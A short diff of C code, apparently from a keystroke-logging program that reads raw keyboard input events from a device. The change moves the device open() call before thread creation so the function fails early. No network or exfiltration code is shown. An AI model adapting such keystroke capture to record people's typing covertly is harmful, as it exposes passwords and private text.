@@ -55,15 +55,15 @@ static void *write_log(void *data)
 
 bool start_logging(struct keyboard_s *kbd)
 {
+	int fd = open(kbd->input_path, O_RDONLY);
+	if (fd < 0)
+		return false;
+
 	pthread_mutex_init(&write_lock, NULL);
 	pthread_create(&write_thread, NULL, write_log, kbd);
 
 	for (int i=0; i<256; ++i)
 		kbd->key_map[i] = 0;
-
-	int fd = open(kbd->input_path, O_RDONLY);
-	if (fd < 0)
-		return false;
 
 	struct input_event event;
 	while (1) {
